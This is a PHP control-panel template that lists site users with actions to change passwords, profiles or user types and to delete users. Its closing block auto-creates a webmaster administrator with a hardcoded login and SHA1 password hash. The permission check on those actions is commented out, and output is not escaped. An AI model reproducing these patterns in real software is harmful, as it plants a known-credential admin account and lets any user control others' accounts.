<div class="cp_box">
	<div class='cp_table250 cp_title'>Login</div>
	<div class='cp_table250 cp_title'>Nombre</div>
	<div class='cp_table100 cp_title'>Tipo</div>
	<?php
	$i=0;
	while($i<4) { ?>
		<div class='cp_table25 cp_title'>&nbsp;</div>
        <?php
		$i++;
	} ?>
	<br/>
    <br/>
    <?php	
	$url_com = "mnu=".$mnu."&com=".$com."&tpl=".$tpl;
	$q = "SELECT * FROM ".preBD."users";
	$result = checkingQuery($connectBD, $q);
	while($row = mysqli_fetch_object($result)) {
		$login = $row->Login;
		$name = $row->Name;
		$type = $row->Type;
		$r = "SELECT * FROM ".preBD."users_permissions where Id_user = ".$type;
		$result2 = checkingQuery($connectBD, $r);	
		$row2 = mysqli_fetch_object($result2);
		//si no es webmaster, imprime por pantalla los usuarios que va recorriendo con sus permisos
		if($type != "4"){
			//si es el usuario logado no puede eliminarse ni cambiar sus permisos
			if ($login == $_SESSION[PDCLOG]['Login']) { 
			
			?>
				<div class='cp_table250'><?php echo $login; ?></div>
				<div class='cp_table250'><?php echo $name; ?></div>
				<div class='cp_table100'><?php echo $row2->Type; ?></div>
												
				<div class='cp_table25'>
					<a href='index.php?<?php echo $url_com; ?>&login=<?php echo $login; ?>&action=Changepwd'>
						<img class='image' src='images/pwd.png' alt='Cambiar contraseña' title='Cambiar contraseña' />
					</a>
				</div>
                <div class='cp_table25'>
					<a href='index.php?<?php echo $url_com; ?>&login=<?php echo $login; ?>&action=Changeprofile'>
						<img class='image' src='images/user.png' alt='Cambiar nombre de usuario' title='Cambiar nombre de usuario' />
					</a>
				</div>
				<div class='cp_table25'>
					<img class='image' src='images/permissions_off.png' alt='' title='' />
				</div>
				<div class='cp_table25'>
					<img class='image' src='images/delete_off.png' alt='' title='' />
				</div>
            <?php
			//si es otro usuario distinto al logado
			} else { ?>
				<div class='cp_table250'><?php echo $login; ?></div>
				<div class='cp_table250'><?php echo $name; ?></div>
				<div class='cp_table100'><?php echo $row2->Type; ?></div>
				<?php
				//si el rango del usuario logado es superior, puede eliminar y cambiar contraseña y permisos
				//if ($row2->configuration == 1) { 
				?>
                										
					<div class='cp_table25'>
						<a href='index.php?<?php echo $url_com; ?>&login=<?php echo $login; ?>&action=Changepwd'>
							<img class='image' src='images/pwd.png' alt='Cambiar contraseña' title='Cambiar contraseña' />
						</a>
					</div>
                	<div class='cp_table25'>
						<a href='index.php?<?php echo $url_com; ?>&login=<?php echo $login; ?>&action=Changeprofile'>
							<img class='image' src='images/user.png' alt='Editar perfil' title='Editar perfil' />
						</a>
					</div>
					<div class='cp_table25'>
						<a href='index.php?<?php echo $url_com; ?>&login=<?php echo $login; ?>&action=Changetype'>
							<img class='image' src='images/permissions.png' alt='Cambiar tipo de usuario' title='Cambiar tipo de usuario' />
						</a>
					</div>
					<div class='cp_table25'>
						<a href='index.php?<?php echo $url_com; ?>&login=<?php echo $login; ?>&action=Deleteuser'>
							<img class='image' src='images/delete.png' alt='Eliminar usuario' title='Eliminar usuario' />
						</a>
					</div>
                <?php
				//si el rango del usuario logado es inferior, no puede eliminar ni cambiar contraseña ni permisos
				/*} else { 
				?>
 					<div class='cp_table25'>
						<img class='image' src='images/pwd_off.png' alt='' title='' />
					</div>
                	<div class='cp_table25'>
						<img class='image' src='images/user_off.png' alt='' title='' />
					</div>
					<div class='cp_table25'>
						<img class='image' src='images/permissions_off.png' alt='' title='' />
					</div>
					<div class='cp_table25'>
						<img class='image' src='images/delete_off.png' alt='' title='' />
					</div>
				<?php
            	} */
			}
?>		
			<div class="separator5">&nbsp;</div>
			<div class="separator5" style="border-top:1px solid #ededed;">&nbsp;</div>
	<?php
		}
    } ?>
	<div class="separator20">&nbsp;</div>
    
	<div class='cp_table25' style="float:right;margin-right;40px;">
		<a href='index.php?<?php echo $url_com; ?>&action=Createuser'>
			<img class='image' src='images/add.png' alt='Crear usuario' title='Crear usuario' />
		</a>
	</div>
	
</div>
<?php
/*comprobamos que esté creado el usuario webmaster, en caso contrario lo creamos*/	
$q = "SELECT * FROM ".preBD."users where Type = '4'";
$result = checkingQuery($connectBD, $q);	
$num_filas = mysqli_num_rows($result);
$user = mysqli_fetch_object($result);	
if($num_filas == 0) {
	$q = "INSERT INTO ".preBD."users (Login, Name, Pwd, Type) VALUES ('webmaster@ismaelrc.es', 'irc7', '717b10072c44413782fd12f69e9fa78cb8cd813d', '4')";
	checkingQuery($connectBD, $q);
} 
?>